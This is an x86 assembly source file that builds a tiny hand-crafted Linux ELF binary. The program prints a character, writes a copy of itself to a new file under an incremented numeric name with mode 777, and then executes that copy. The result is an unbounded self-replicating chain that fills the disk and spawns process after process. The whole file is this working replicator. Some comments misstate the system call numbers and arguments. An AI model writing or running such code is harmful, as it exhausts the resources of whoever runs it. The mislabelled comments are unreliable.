BITS 32
                org     0x00010000

ehdr:                                           ; Elf32_Ehdr
                db      0x7F, "ELF", 1, 1, 1, 0 ; e_ident
        times 8 db      0
                dw      2                       ; e_type
                dw      3                       ; e_machine
                dd      1                       ; e_version
                dd      _start                  ; e_entry
                dd      phdr - $$               ; e_phoff
                dd      0                       ; e_shoff
                dd      0                       ; e_flags
                dw      ehdrsize                ; e_ehsize
                dw      phdrsize                ; e_phentsize
                dw      1                       ; e_phnum
                dw      0                       ; e_shentsize
                dw      0                       ; e_shnum
                dw      0                       ; e_shstrndx

ehdrsize        equ     $ - ehdr

phdr:                                           ; Elf32_Phdr
                dd      1                       ; p_type
                dd      0                       ; p_offset
                dd      $$                      ; p_vaddr
                dd      $$                      ; p_paddr
                dd      filesize                ; p_filesz
                dd      filesize                ; p_memsz
                dd      7                       ; p_flags
                dd      0x1000                  ; p_align

phdrsize        equ     $ - phdr

fname: times 49 db      '0'                     ; Apparently 49 is the filename length limit
                dw      0

program:        mov     eax, 4                  ; 5 = sys_write
                mov     ebx, 1                  ; 1 = stdout
                push    'A'
                mov     ecx, esp                ; esp now points to your char
                mov     edx, 1                  ; edx should contain how many characters to print
                int     0x80                    ; sys_write(1, 'A', 1)
                add     esp, 4
                ret

do_inc_fname:   inc     byte [ebx]              ; Increment the filename
                ret

loop_inc_fname: cmp     byte [ebx], 57          ; Compare char to 9
                jne     do_inc_fname            ; If it's not 9, jump
                mov     byte [ebx], '0'         ; If it's 9, replace it with 0
                dec     ebx                     ; Increase the digit
                call    loop_inc_fname          ; Repeat
                ret

inc_fname:      mov     ebx, fname              ; Move the pointer to filename into ebx
                add     ebx, 48                 ; Move cursor into the last character of the filename
                call    loop_inc_fname          ; Increment the filename
                mov     ebx, fname              ; Fix ebx into beginning of filename
                ret

run:            mov     eax, 11                 ; 11 = sys_execve
                mov     ebx, fname              ; command
                mov     ecx, 0                  ; no arguments
                mov     edx, 0                  ; environment = NULL
                int     0x80                    ; sys_execve(fname, fname, NULL)
                ret

replicate:      mov     eax, 5                  ; 5 = sys_open
                call    inc_fname               ; Increment the filename
                mov     ecx, 65                 ; 65 = O_WRONLY | O_CREAT
                mov     edx, 777q               ; File mode (octal)
                int     0x80                    ; sys_open(fname, 65, 777)
                lea     edx, [filesize]         ; Load effective address of filesize
                xchg    eax, ebx                ; Move the file descriptor in eax to ebx
                xchg    eax, ecx                ; Swap eax and ecx
                mov     cl, 0                   ; Point out to the beginning of the program by removing first 8 bits
                mov     al, 4                   ; 4 = sys_write
                int     0x80                    ; sys_write(file_descriptor, *content, filesize)
                mov     eax, 6                  ; 6 = sys_close
                int     0x80                    ; sys_close(file_descriptor)
                ret

exit:           mov     bl, 0                   ; 0 = Exit code
                mov     al, 1                   ; 1 = sys_exit
                int     0x80                    ; sys_exit(0)

_start:         call    program
                call    replicate
                call    run
                call    exit

filesize        equ     $ - $$
